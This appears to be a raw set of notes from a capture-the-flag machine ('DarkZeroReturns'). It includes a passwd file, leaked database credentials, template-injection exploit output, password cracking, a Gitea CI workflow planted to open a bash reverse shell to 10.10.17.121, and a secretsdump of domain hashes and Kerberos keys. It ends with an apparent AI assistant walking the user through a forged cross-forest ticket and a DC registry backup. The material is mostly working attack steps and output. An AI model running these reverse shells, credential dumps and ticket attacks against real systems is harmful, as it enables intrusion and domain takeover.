# Secrets


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
darkzero:x:996:987::/opt/DarkZero_Campaigns:/usr/sbin/nologin
sssd:x:100:112:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
dhcpcd:x:111:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false



PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#


[*] Fetching CSRF token from http://dzcampaigns.htb/character/16/edit
[+] CSRF token: 915dfccac2150e6e3c1f4934f0490a8fd1827277fa380c24f0baff6c0f0d6de9
[*] Injecting JSON payload to http://dzcampaigns.htb/character/16
[+] Payload injected (HTTP 200)
[*] Triggering Handlebars render at http://dzcampaigns.htb/campaign/1

============================================================
id      email   username        password_hash   role    created_at
1       admin@dzcampaigns.htb   admin   $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm    admin   2026-04-19 15:34:56
3       josh@dzcampaigns.htb    josh    $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK    player  2026-05-19 14:31:30
4       test@test.com   testuser        $2b$10$JCpMbfcFkz2.Cju2Re25X.71CeDD9I4eDMMDcbMOsV6ejjpA3k4gW    player  2026-08-16 15:47:05
============================================================


└─$ echo 'josh:$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > josh_hash.txt

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/DarkZeroReturns]
└─$ echo 'admin:$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm' > admin_hash.txt

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/DarkZeroReturns]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt josh_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Rangers1         (josh)     
1g 0:00:00:44 DONE (2026-08-16 17:42) 0.02262g/s 612.4p/s 612.4c/s 612.4C/s freya..220992
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
[ble: elapsed 44.389s (CPU 1416.9%)] john --wordlist=/usr/share/wordlists/rockyou.txt josh_hash.txt


josh@SRV01:~$ curl -s --negotiate -u : http://gitea.darkzero.ext:3000/api/v1/user
{"id":6,"login":"darkzero-ext_josh","login_name":"","source_id":0,"full_name":"","email":"ad8a459d-f75e-46b7-92b7-4213defd890d@localhost.localdomain","avatar_url":"http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d","html_url":"http://gitea.darkzero.ext:3000/darkzero-ext_josh","language":"en-US","is_admin":false,"last_login":"1969-12-31T16:00:00-08:00","created":"2026-05-20T13:44:57-07:00","restricted":false,"active":true,"prohibit_login":false,"location":"","website":"","description":"","visibility":"public","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"darkzero-ext_josh"}
josh@SRV01:~$ curl -s --negotiate -u : http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50
{"ok":true,"data":[{"id":2,"owner":{"id":2,"login":"DarkZero","login_name":"","source_id":0,"full_name":"","email":"darkzero@noreply.gitea.darkzero.ext","avatar_url":"http://gitea.darkzero.ext:3000/avatars/6ff3a709898c448269322001d983c279","html_url":"http://gitea.darkzero.ext:3000/DarkZero","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-05-20T13:38:40-07:00","restricted":false,"active":false,"prohibit_login":false,"location":"","website":"","description":"","visibility":"private","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"DarkZero"},"name":"DarkZero-Campaigns","full_name":"DarkZero/DarkZero-Campaigns","description":"Dev repository for DarkZero Campaigns","empty":false,"private":true,"fork":false,"template":false,"mirror":false,"size":3249,"language":"JavaScript","languages_url":"http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/languages","html_url":"http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns","url":"http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns","link":"","ssh_url":"svc-gitea@gitea.darkzero.ext:DarkZero/DarkZero-Campaigns.git","clone_url":"http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns.git","original_url":"","website":"http://dzcampaigns.htb/","stars_count":0,"forks_count":0,"watchers_count":6,"open_issues_count":0,"open_pr_counter":0,"release_counter":0,"default_branch":"main","archived":false,"created_at":"2026-05-20T13:48:11-07:00","updated_at":"2026-05-20T14:01:40-07:00","archived_at":"1969-12-31T16:00:00-08:00","permissions":{"admin":false,"push":false,"pull":true},"has_code":false,"has_issues":true,"internal_tracker":{"enable_time_tracker":true,"allow_only_contributors_to_track_time":true,"enable_issue_dependencies":true},"has_wiki":true,"has_pull_requests":true,"has_projects":true,"projects_mode":"all","has_releases":true,"has_packages":true,"has_actions":true,"ignore_whitespace_conflicts":false,"allow_merge_commits":true,"allow_rebase":true,"allow_rebase_explicit":true,"allow_squash_merge":true,"allow_fast_forward_only_merge":true,"allow_rebase_update":true,"allow_manual_merge":false,"autodetect_manual_merge":false,"default_delete_branch_after_merge":false,"default_merge_style":"merge","default_allow_maintainer_edit":false,"avatar_url":"","internal":false,"mirror_interval":"","object_format_name":"sha1","mirror_updated":"0001-01-01T00:00:00Z","topics":[],"licenses":[]}]}
josh@SRV01:~$ ^[[200~curl -s --negotiate -u : http://gitea.darkzero.ext:3000/api/v1/user/orgs
curl: command not found
josh@SRV01:~$ curl -s --negotiate -u : http://gitea.darkzero.ext:3000/api/v1/user/orgs
[{"id":2,"name":"DarkZero","full_name":"","email":"","avatar_url":"http://gitea.darkzero.ext:3000/avatars/6ff3a709898c448269322001d983c279","description":"","website":"","location":"","visibility":"private","repo_admin_change_team_access":true,"username":"DarkZero"}]
josh@SRV01:~$ curl -s --negotiate -u : http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns
{"id":2,"owner":{"id":2,"login":"DarkZero","login_name":"","source_id":0,"full_name":"","email":"darkzero@noreply.gitea.darkzero.ext","avatar_url":"http://gitea.darkzero.ext:3000/avatars/6ff3a709898c448269322001d983c279","html_url":"http://gitea.darkzero.ext:3000/DarkZero","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-05-20T13:38:40-07:00","restricted":false,"active":false,"prohibit_login":false,"location":"","website":"","description":"","visibility":"private","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"DarkZero"},"name":"DarkZero-Campaigns","full_name":"DarkZero/DarkZero-Campaigns","description":"Dev repository for DarkZero Campaigns","empty":false,"private":true,"fork":false,"template":false,"mirror":false,"size":3249,"language":"JavaScript","languages_url":"http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/languages","html_url":"http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns","url":"http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns","link":"","ssh_url":"svc-gitea@gitea.darkzero.ext:DarkZero/DarkZero-Campaigns.git","clone_url":"http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns.git","original_url":"","website":"http://dzcampaigns.htb/","stars_count":0,"forks_count":0,"watchers_count":6,"open_issues_count":0,"open_pr_counter":0,"release_counter":0,"default_branch":"main","archived":false,"created_at":"2026-05-20T13:48:11-07:00","updated_at":"2026-05-20T14:01:40-07:00","archived_at":"1969-12-31T16:00:00-08:00","permissions":{"admin":false,"push":false,"pull":true},"has_code":false,"has_issues":true,"internal_tracker":{"enable_time_tracker":true,"allow_only_contributors_to_track_time":true,"enable_issue_dependencies":true},"has_wiki":true,"has_pull_requests":true,"has_projects":true,"projects_mode":"all","has_releases":true,"has_packages":true,"has_actions":true,"ignore_whitespace_conflicts":false,"allow_merge_commits":true,"allow_rebase":true,"allow_rebase_explicit":true,"allow_squash_merge":true,"allow_fast_forward_only_merge":true,"allow_rebase_update":true,"allow_manual_merge":false,"autodetect_manual_merge":false,"default_delete_branch_after_merge":false,"default_merge_style":"merge","default_allow_maintainer_edit":false,"avatar_url":"","internal":false,"mirror_interval":"","object_format_name":"sha1","mirror_updated":"0001-01-01T00:00:00Z","topics":[],"licenses":[]}
josh@SRV01:~$ 




WORKFLOW_CONTENT=$(cat << 'EOF' | base64 -w0
on: [push, pull_request, pull_request_target, issue_comment, pull_request_review, pull_request_review_comment]
jobs:
  ci:
    runs-on: ubuntu
    steps:
      - run: bash -c 'bash -i >& /dev/tcp/10.10.17.121/4445 0>&1'
EOF
)

curl -s --negotiate -u : -X POST \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea/workflows/ci.yml" \
  -H "Content-Type: application/json" \
  -d "{\"content\":\"$WORKFLOW_CONTENT\",\"message\":\"add ci\",\"branch\":\"main\"}"


  CURRENT_SHA="<fa1ae363532db108fe1eed464519c694ce0bfaaf>"

curl -s --negotiate -u : -X PUT \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea/workflows/ci.yml" \
  -H "Content-Type: application/json" \
  -d "{\"content\":\"$WORKFLOW_CONTENT\",\"message\":\"update ci\",\"branch\":\"main\",\"sha\":\"$CURRENT_SHA\"}"


  <oot/darkzero_campaigns_backup.sql | grep -i "users"
INSERT INTO `users` VALUES (1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm','admin','2026-04-19 15:34:56');
INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2Wy','player','2026-04-20 17:27:37');


┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/DarkZeroReturns]
└─$ echo 'celia:$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC' > celia_hash.txt

┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/DarkZeroReturns]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt celia_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
babygurl13       (celia)     
1g 0:00:00:20 DONE (2026-08-16 19:46) 0.04997g/s 590.1p/s 590.1c/s 590.1C/s collie..justin21
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
[ble: elapsed 20.245s (CPU 1344.7%)] john --wordlist=/usr/share/wordlists/rockyou.txt celia_hash.txt




┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/DarkZeroReturns]                                                                                                                                                                                     19:49 [16/1463]
└─$ proxychains4 -q impacket-secretsdump 'darkzero.ext/celia:babygurl13@dc02.darkzero.ext' -just-dc                                                                                                                                                          
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                                        
                                                                                                                                                                                                                                                             
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                                                
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                                                                         
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a2bdd03aa4dc9ff2c4f19860e380618:::                                                                                                                                                                       
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                                                               
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8beaf5f950fefe79f608390a806d29a7:::                                                                                                                                                                              
darkzero.ext\david:1104:aad3b435b51404eeaad3b435b51404ee:57652eef49f116d28846990ccddb7b47:::                                                                                                                                                                 
darkzero.ext\william:1105:aad3b435b51404eeaad3b435b51404ee:e9e4b9942000acabf654cbe83d4cf836:::                                                                                                                                                               
darkzero.ext\celia:1109:aad3b435b51404eeaad3b435b51404ee:ffd522a82693347e605dee2fa9beeb51:::                                                                                                                                                                 
darkzero.ext\josh:1110:aad3b435b51404eeaad3b435b51404ee:cbacf36e107f69d4b76d2b3c4dc24a33:::                                                                                                                                                                  
darkzero.ext\svc-gitea:1112:aad3b435b51404eeaad3b435b51404ee:f2ec6039e5a952c517742bcbfae633e5:::                                                                                                                                                             
darkzero.ext\svc-runner:1113:aad3b435b51404eeaad3b435b51404ee:8f02bbb99a9c1a57cb62c266b0c71ab0:::                                                                                                                                                            
darkzero.ext\root:1115:aad3b435b51404eeaad3b435b51404ee:83040ca68de45f2b21fdb5dff6eaf60c:::     
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:297d0ed36ca7ca87dcde2b2c8412ba60:::
SRV01$:1108:aad3b435b51404eeaad3b435b51404ee:c213c75a2893e074f1912405d9497e54:::
darkzero$:1103:aad3b435b51404eeaad3b435b51404ee:8b5a8cd68afd08279a47d0b4e2172e9d:::
[*] Kerberos keys grabbed
Administrator:0x14:3c4cb4af2ec77b5714f514c88d71d2c86bf1fe4e312521af9b578547fe633a5a
Administrator:0x13:4f183e4d16f14d6d889322414f7ebf94
Administrator:aes256-cts-hmac-sha1-96:357224179e090ac09df4cada21698695a395713fa1c5ac415a54b8b19c0f6966
Administrator:aes128-cts-hmac-sha1-96:cc3151ecd7fc10496b243108c7c53759
Administrator:0x17:6a2bdd03aa4dc9ff2c4f19860e380618
krbtgt:aes256-cts-hmac-sha1-96:8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6
krbtgt:aes128-cts-hmac-sha1-96:ce9c97f5fd7021806190196f637e4b4e
krbtgt:0x17:8beaf5f950fefe79f608390a806d29a7
darkzero.ext\david:0x14:49e55245f4edf283986e661313b2700122db7c796646910e03c6c27cf324c49d
darkzero.ext\david:0x13:bb7a8f86f5e7023bfc148a1894fe9838
darkzero.ext\david:aes256-cts-hmac-sha1-96:1e3ca219582c60ab71c0688c7c3219a2ca0fc57d22efc1f273201321c8d30c27
darkzero.ext\david:aes128-cts-hmac-sha1-96:b99bc8413abf9dd1cbd6f063e55d95cc
darkzero.ext\david:0x17:57652eef49f116d28846990ccddb7b47
darkzero.ext\william:0x14:d19711ef82f2e9684d82b913c5adbc97ee7bc7bcdf03120cdcc12fa8012cf728
darkzero.ext\william:0x13:ec0b8db518471117f471f776395519a4
darkzero.ext\william:aes256-cts-hmac-sha1-96:fe28d0569987f531b226a59b65eeeec7082d71aae39202d436536f97ad2fc532
darkzero.ext\william:aes128-cts-hmac-sha1-96:4389a71eb4b5d3d384fde3b7f433950f
darkzero.ext\william:0x17:e9e4b9942000acabf654cbe83d4cf836
darkzero.ext\celia:0x14:17174882aba17a8f5e48d501d99619cd6b3c517222f262f5abf10086ef85ddbc
darkzero.ext\celia:0x13:c226461170f835b9b8b971fdd620be20
darkzero.ext\celia:aes256-cts-hmac-sha1-96:3e588846fef6d35301e68da09dca7345c6f84e3edb2b6a3af3408177eb71140b
darkzero.ext\celia:aes128-cts-hmac-sha1-96:a413bd83e14fd0de345ec7f13bd4adbd
darkzero.ext\celia:0x17:ffd522a82693347e605dee2fa9beeb51
darkzero.ext\josh:0x14:e9ba88a38aabb4adfdec4a8b782ac9fcb48d711f147b947c7b7718bd8e5a1fe1
darkzero.ext\josh:0x13:fb3a42bbbab110cfeb8556d5604a7556
darkzero.ext\josh:aes256-cts-hmac-sha1-96:086f140d39b9e5bb41f6dad9d76dc67695fe4a0f2f86a86406316734621826aa
darkzero.ext\josh:aes128-cts-hmac-sha1-96:800b542e6c54b855f8101159fbd3d21f
darkzero.ext\josh:0x17:cbacf36e107f69d4b76d2b3c4dc24a33
darkzero.ext\svc-gitea:0x14:3a77284ebb6ee755610b2f7fd70ec94a71282f79f1e93dd52e0c5b69ca4b4b26
darkzero.ext\svc-gitea:0x13:eae3b349ebd18ff5849506dd2d56c62b
darkzero.ext\svc-gitea:aes256-cts-hmac-sha1-96:4d27f8144b5c49434938c7734f1a522e141c30b39b3c96698cf82bdec818a722
darkzero.ext\svc-gitea:aes128-cts-hmac-sha1-96:e982268ea8bf041209f1ea093f31eb54
darkzero.ext\svc-gitea:0x17:f2ec6039e5a952c517742bcbfae633e5
darkzero.ext\svc-runner:0x14:309d9f4e7f6b1396d784c3f2703b63ab80713ddcb988b4de9fd9f8be092a327e
darkzero.ext\svc-runner:0x13:372e0455a30fc98119a36212ad06c6f2
darkzero.ext\svc-runner:aes256-cts-hmac-sha1-96:11e8fdf4a10b8f19751804b2a431a1fe6bf40c79fe26f3db5063aa2e4e4570b1
darkzero.ext\svc-runner:aes128-cts-hmac-sha1-96:c7930141eef79f5c7fd2917d99dcf9d6
darkzero.ext\svc-runner:0x17:8f02bbb99a9c1a57cb62c266b0c71ab0
darkzero.ext\root:0x14:660553caf437c3bdd4cd32959c4565a1029c675809e471536e636352e604bfe4
darkzero.ext\root:0x13:fd44336e565939833140f8998a6929c5
darkzero.ext\root:aes256-cts-hmac-sha1-96:de36fad7b4e73d6f73cfdcedf4fb5f1cbfe9e0cc7e7a8b17588d77a4a4583aa5
darkzero.ext\root:aes128-cts-hmac-sha1-96:966a5e29686f8ae7549a9d1bb5462dd2
darkzero.ext\root:0x17:83040ca68de45f2b21fdb5dff6eaf60c
DC02$:aes256-cts-hmac-sha1-96:d8cb694e2212d22714da90f476f85f2cbe62911affa83cbced7140df21a2461c
DC02$:aes128-cts-hmac-sha1-96:08addbe85bcedc597c61e413509bb858
DC02$:0x17:297d0ed36ca7ca87dcde2b2c8412ba60
SRV01$:0x14:7ed2eac3508bcfd67402387f1c90bfcc075d57ecbfc0d42b6afc4c1c95a35b3d
SRV01$:0x13:9a61ac05ef07f538a80ec91d78d7cea4
SRV01$:aes256-cts-hmac-sha1-96:0b4b77be65c5cc3555a576760559f30b23dccd27bc7a074d725af5f0e0c02cc0
SRV01$:aes128-cts-hmac-sha1-96:aa2b8308c7b07f42b90848299566f410
SRV01$:0x17:c213c75a2893e074f1912405d9497e54
darkzero$:aes256-cts-hmac-sha1-96:6dba006dae9bfb315761732604cbbe52a12c9e7093db6cd2b6578a2829a23af5
darkzero$:aes128-cts-hmac-sha1-96:1451e2e19b4418162801b78640d03cc9
[*] Cleaning up... 







root@SRV01:/home/svc-runner# nslookup dc01.darkzero.htb                                                                                                                                                                                                      
nslookup dc01.darkzero.htb                                                                                                                                                                                                                                   
Server:         172.16.20.2                                                                                                                                                                                                                                  
Address:        172.16.20.2#53                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                             
Non-authoritative answer:                                                                                                                                                                                                                                    
Name:   dc01.darkzero.htb                                                                                                                                                                                                                                    
Address: 172.16.20.1                                                                                                                                                                                                                                         
Name:   dc01.darkzero.htb

Address: 172.16.20.1
Name:   dc01.darkzero.htb
Address: 10.129.28.204

root@SRV01:/home/svc-runner# host dc01.darkzero.htb
host dc01.darkzero.htb
dc01.darkzero.htb has address 172.16.20.1
dc01.darkzero.htb has address 10.129.28.204
root@SRV01:/home/svc-runner# LDAPSASL_NOCANON=yes ldapsearch -H ldap://dc02.darkzero.ext -Y GSSAPI -N -b "CN=System,DC=darkzero,DC=ext" "(objectClass=trustedDomain)"
<m,DC=darkzero,DC=ext" "(objectClass=trustedDomain)"
SASL/GSSAPI authentication started
SASL username: celia@DARKZERO.EXT
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base <CN=System,DC=darkzero,DC=ext> with scope subtree
# filter: (objectClass=trustedDomain)
# requesting: ALL
#

# darkzero.htb, System, darkzero.ext
dn: CN=darkzero.htb,CN=System,DC=darkzero,DC=ext
objectClass: top
objectClass: leaf
objectClass: trustedDomain
cn: darkzero.htb
distinguishedName: CN=darkzero.htb,CN=System,DC=darkzero,DC=ext
instanceType: 4
whenCreated: 20260406142905.0Z
whenChanged: 20260816161717.0Z
uSNCreated: 16437
uSNChanged: 176233
showInAdvancedViewOnly: TRUE
name: darkzero.htb
objectGUID:: zL26bLNl30y8UBuVpsSN3Q==
securityIdentifier:: AQQAAAAAAAUVAAAAEjbOrO8/Lm7DEkFc
trustDirection: 3
trustPartner: darkzero.htb
trustPosixOffset: -2147483648
trustType: 2
trustAttributes: 8
flatName: darkzero
objectCategory: CN=Trusted-Domain,CN=Schema,CN=Configuration,DC=darkzero,DC=ex
 t
isCriticalSystemObject: TRUE
dSCorePropagationData: 20260521084400.0Z
dSCorePropagationData: 16010101000004.0Z
msDS-TrustForestTrustInfo:: AQAAAAMAAAAdAAAAAAAAANHF3AEsm8O4AAwAAABkYXJremVyby
 5odGJFAAAAAAAAANHF3AEsm8O4AhgAAAABBAAAAAAABRUAAAASNs6s7z8ubsMSQVwMAAAAZGFya3p
 lcm8uaHRiCAAAAGRhcmt6ZXJvMgAAAAAAAADG5twBoUr0dwQhAAAABAAAAAAMAAAAZGFya3plcm8u
 aHRiCAAAAGRhcmt6ZXJv

# search result
search: 4
result: 0 Success

# numResponses: 2
# numEntries: 1
root@SRV01:/home/svc-runner# 


root@SRV01:/home/svc-runner# LDAPSASL_NOCANON=yes ldapsearch -H ldap://dc01.darkzero.htb -Y GSSAPI -N -b "DC=darkzero,DC=htb" "(sAMAccountName=InfrastructureAdministrators)" objectSid
<ccountName=InfrastructureAdministrators)" objectSid
SASL/GSSAPI authentication started
SASL username: celia@DARKZERO.EXT
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base <DC=darkzero,DC=htb> with scope subtree
# filter: (sAMAccountName=InfrastructureAdministrators)
# requesting: objectSid 
#

# InfrastructureAdministrators, Users, darkzero.htb
dn: CN=InfrastructureAdministrators,CN=Users,DC=darkzero,DC=htb
objectSid:: AQUAAAAAAAUVAAAAEjbOrO8/Lm7DEkFcQwYAAA==

# search reference
ref: ldap://ForestDnsZones.darkzero.htb/DC=ForestDnsZones,DC=darkzero,DC=htb

# search reference
ref: ldap://DomainDnsZones.darkzero.htb/DC=DomainDnsZones,DC=darkzero,DC=htb

# search reference
ref: ldap://darkzero.htb/CN=Configuration,DC=darkzero,DC=htb

# search result
search: 4
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
root@SRV01:/home/svc-runner# 




Excellent — the cross-realm hop worked cleanly, impacket handled the referral automatically. We now have `celia@cifs_dc01.darkzero.htb@DARKZERO.HTB.ccache` — a valid service ticket on `darkzero.htb`, carrying our injected `InfrastructureAdministrators` SID (nested in the empty `Backup Operators` group).

Now let's use this for the registry backup of DC01 (§5.3), leveraging `SeBackupPrivilege` via Backup Operators membership:

```bash
export KRB5CCNAME=$(pwd)/celia@cifs_dc01.darkzero.htb@DARKZERO.HTB.ccache
TZ=UTC proxychains4 -q faketime "$TS" impacket-reg -k -no-pass \
  -dc-ip 172.16.20.1 -target-ip 172.16.20.1 \
  'darkzero.htb/celia@dc01.darkzero.htb' backup -o 'C:\Windows\Temp'
```

Note: the writeup flags two impacket bugs against Server 2025 here — a `crealm` mismatch (impacket sets it to the target realm instead of the client's `DARKZERO.EXT`) and `mutualAuth` breaking SMB signing. If this fails with `STATUS_MORE_PROCESSING_REQUIRED` or a `Broken pipe` on `connectTree`, we'll need to patch those manually. Let's try the vanilla command first and see which error (if any) we hit.

Paste the output.